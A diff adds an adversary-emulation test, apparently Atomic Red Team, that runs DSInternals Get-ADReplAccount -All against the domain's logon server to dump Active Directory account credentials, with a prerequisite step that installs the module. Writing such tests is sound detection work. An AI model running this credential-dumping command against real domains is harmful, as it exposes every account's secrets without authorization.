@@ -1808,6 +1808,36 @@ credential-access:
           "exit"
 
 '
+    - name: Run DSInternals Get-ADReplAccount
+      auto_generated_guid: a0bced08-3fc5-4d8b-93b7-e8344739376e
+      description: "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon
+        successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/)
+        CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        logonserver:
+          description: ComputerName argument default %logonserver%
+          type: String
+          default: $ENV:logonserver.TrimStart("\")
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DSInternals must be installed
+
+'
+        prereq_command: |
+          $RequiredModule = Get-Module -Name DSInternals -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name DSInternals -Scope CurrentUser -Force
+
+'
+      executor:
+        command: 'Get-ADReplAccount -All -Server #{logonserver}
+
+'
+        name: powershell
+        elevation_required: false
   T1556.001:
     technique:
       external_references:
